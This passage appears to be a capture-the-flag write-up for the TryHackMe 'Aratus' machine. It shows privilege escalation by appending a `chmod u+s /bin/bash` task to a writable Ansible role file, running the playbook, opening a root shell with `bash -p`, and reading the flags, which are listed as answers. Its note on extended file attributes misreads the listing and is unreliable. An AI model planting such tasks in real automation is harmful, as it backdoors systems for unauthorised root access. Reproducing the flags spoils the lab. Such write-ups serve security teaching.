-rw-rw-r--. 1 automation automation  546 Dec  2  2021 configure-Solaris.yml
-rw-rw-r--. 1 automation automation  711 Dec  2  2021 configure-Suse.yml
-rw-rw-r--. 1 automation automation 1.4K Dec  2  2021 main.yml
-rw-rw-r--. 1 automation automation  193 Dec  2  2021 setup-Debian.yml
-rw-rw-r--. 1 automation automation  198 Dec  2  2021 setup-RedHat.yml
-rw-rw-r--. 1 automation automation  134 Dec  2  2021 setup-Solaris.yml
-rw-rw-r--. 1 automation automation  133 Dec  2  2021 setup-Suse.yml

The plus sign (+) at the end of the file permissions in the listing indicates that the file has extended file attributes associated with it. Extended file attributes are additional metadata that can be attached to a file, providing extra information beyond the basic file permissions.

Extended file attributes are used for various purposes, such as storing file metadata, security-related information, or custom data. They can be used by the system or applications to keep track of additional properties of a file.

In your case, the files "configure-RedHat.yml" has the extended file attributes associated with it, as indicated by the plus sign in the file permissions listing. To view the extended attributes of a file, you can use the `lsattr`

[theodore@aratus tasks]$ lsattr configure-RedHat.yml
---------------- configure-RedHat.yml

[theodore@aratus tasks]$ cat configure-RedHat.yml
---
- name: Configure Apache.
  lineinfile:
    dest: "{{ apache_server_root }}/conf/{{ apache_daemon }}.conf"
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
    state: present
    mode: 0644
  with_items: "{{ apache_ports_configuration_items }}"
  notify: restart apache

- name: Check whether certificates defined in vhosts exist.
  stat: path={{ item.certificate_file }}
  register: apache_ssl_certificates
  with_items: "{{ apache_vhosts_ssl }}"

- name: Add apache vhosts configuration.
  template:
    src: "{{ apache_vhosts_template }}"
    dest: "{{ apache_conf_path }}/{{ apache_vhosts_filename }}"
    owner: root
    group: root
    mode: 0644
  notify: restart apache
  when: apache_create_vhosts | bool

- name: Check if localhost cert exists (RHEL 8 and later).
  stat:
    path: /etc/pki/tls/certs/localhost.crt
  register: localhost_cert
  when: ansible_distribution_major_version | int >= 8

- name: Ensure httpd certs are installed (RHEL 8 and later).
  command: /usr/libexec/httpd-ssl-gencerts
  when:
    - ansible_distribution_major_version | int >= 8
    - not localhost_cert.stat.exists

[theodore@aratus tasks]$ cat configure-RedHat.yml 
---
- name: Configure Apache.
  lineinfile:
    dest: "{{ apache_server_root }}/conf/{{ apache_daemon }}.conf"
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
    state: present
    mode: 0644
  with_items: "{{ apache_ports_configuration_items }}"
  notify: restart apache

- name: Check whether certificates defined in vhosts exist.
  stat: path={{ item.certificate_file }}
  register: apache_ssl_certificates
  with_items: "{{ apache_vhosts_ssl }}"

- name: Add apache vhosts configuration.
  template:
    src: "{{ apache_vhosts_template }}"
    dest: "{{ apache_conf_path }}/{{ apache_vhosts_filename }}"
    owner: root
    group: root
    mode: 0644
  notify: restart apache
  when: apache_create_vhosts | bool

- name: Check if localhost cert exists (RHEL 8 and later).
  stat:
    path: /etc/pki/tls/certs/localhost.crt
  register: localhost_cert
  when: ansible_distribution_major_version | int >= 8

- name: Ensure httpd certs are installed (RHEL 8 and later).
  command: /usr/libexec/httpd-ssl-gencerts
  when:
    - ansible_distribution_major_version | int >= 8
    - not localhost_cert.stat.exists
- name: root
  command: sudo chmod u+s /bin/bash

[theodore@aratus tasks]$ sudo -u automation /opt/scripts/infra_as_code.sh

PLAY [Check status of the firewall] **************************************************************************

TASK [Gathering Facts] ***************************************************************************************
ok: [10.10.132.119]

TASK [check firewalld] ***************************************************************************************
ok: [10.10.132.119]

PLAY RECAP ***************************************************************************************************
10.10.132.119              : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   


PLAY [Install and configure Apache] **************************************************************************

TASK [Gathering Facts] ***************************************************************************************
ok: [10.10.132.119]

TASK [geerlingguy.apache : Include OS-specific variables.] ***************************************************
ok: [10.10.132.119]

TASK [geerlingguy.apache : Include variables for Amazon Linux.] **********************************************
skipping: [10.10.132.119]

TASK [geerlingguy.apache : Define apache_packages.] **********************************************************
ok: [10.10.132.119]

TASK [geerlingguy.apache : include_tasks] ********************************************************************
included: /opt/ansible/roles/geerlingguy.apache/tasks/setup-RedHat.yml for 10.10.132.119

TASK [geerlingguy.apache : Ensure Apache is installed on RHEL.] **********************************************
ok: [10.10.132.119]

TASK [geerlingguy.apache : Get installed version of Apache.] *************************************************
ok: [10.10.132.119]

TASK [geerlingguy.apache : Create apache_version variable.] **************************************************
ok: [10.10.132.119]

TASK [geerlingguy.apache : Include Apache 2.2 variables.] ****************************************************
skipping: [10.10.132.119]

TASK [geerlingguy.apache : Include Apache 2.4 variables.] ****************************************************
ok: [10.10.132.119]

TASK [geerlingguy.apache : Configure Apache.] ****************************************************************
included: /opt/ansible/roles/geerlingguy.apache/tasks/configure-RedHat.yml for 10.10.132.119

TASK [geerlingguy.apache : Configure Apache.] ****************************************************************
ok: [10.10.132.119] => (item={u'regexp': u'^Listen ', u'line': u'Listen 80'})

TASK [geerlingguy.apache : Check whether certificates defined in vhosts exist.] ******************************

TASK [geerlingguy.apache : Add apache vhosts configuration.] *************************************************
ok: [10.10.132.119]

TASK [geerlingguy.apache : Check if localhost cert exists (RHEL 8 and later).] *******************************
skipping: [10.10.132.119]

TASK [geerlingguy.apache : Ensure httpd certs are installed (RHEL 8 and later).] *****************************
skipping: [10.10.132.119]

TASK [geerlingguy.apache : root] *****************************************************************************
[WARNING]: Consider using 'become', 'become_method', and 'become_user' rather than running sudo
changed: [10.10.132.119]

TASK [geerlingguy.apache : Ensure Apache has selected state and enabled on boot.] ****************************
ok: [10.10.132.119]

TASK [configure firewall] ************************************************************************************
ok: [10.10.132.119] => (item=http)
ok: [10.10.132.119] => (item=https)

PLAY RECAP ***************************************************************************************************
10.10.132.119              : ok=16   changed=1    unreachable=0    failed=0    skipped=5    rescued=0    ignored=0   


PLAY [Check the status of SMB] *******************************************************************************

TASK [Gathering Facts] ***************************************************************************************
ok: [10.10.132.119]

TASK [check smbd] ********************************************************************************************
ok: [10.10.132.119]

PLAY RECAP ***************************************************************************************************
10.10.132.119              : ok=18   changed=1    unreachable=0    failed=0    skipped=5    rescued=0    ignored=0   


PLAY [Check status of sshd] **********************************************************************************

TASK [Gathering Facts] ***************************************************************************************
ok: [10.10.132.119]

TASK [check sshd] ********************************************************************************************
ok: [10.10.132.119]

PLAY RECAP ***************************************************************************************************
10.10.132.119              : ok=20   changed=1    unreachable=0    failed=0    skipped=5    rescued=0    ignored=0   


PLAY [Check status of vsftpd] ********************************************************************************

TASK [Gathering Facts] ***************************************************************************************
ok: [10.10.132.119]

TASK [check vsfptd] ******************************************************************************************
ok: [10.10.132.119]

PLAY RECAP ***************************************************************************************************
10.10.132.119              : ok=22   changed=1    unreachable=0    failed=0    skipped=5    rescued=0    ignored=0   

[theodore@aratus tasks]$ ls
configure-Debian.yml  configure-Solaris.yml  main.yml          setup-RedHat.yml   setup-Suse.yml
configure-RedHat.yml  configure-Suse.yml     setup-Debian.yml  setup-Solaris.yml
[theodore@aratus tasks]$ ls -la /bin/bash
-rwsr-xr-x. 1 root root 964536 Nov 24  2021 /bin/bash

[theodore@aratus tasks]$ bash -p
bash-4.2# cd /root
bash-4.2# ls
anaconda-ks.cfg  root.txt  scripts
bash-4.2# cat root.txt 
THM{d8afc85983603342f6c6979b20e06cf6}
bash-4.2# cd scripts/
bash-4.2# ls
get-ip-ansible.sh
bash-4.2# cat get-ip-ansible.sh 
#!/bin/bash
/usr/sbin/ip address show dev eth0 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -n 1 > /opt/ansible/inventory


```

What is the user.txt flag?

*THM{ba8d3b87bfdb9d10115cbe24feabbc20}*

What is the root.txt flag?

*THM{d8afc85983603342f6c6979b20e06cf6}*

[[Topology]]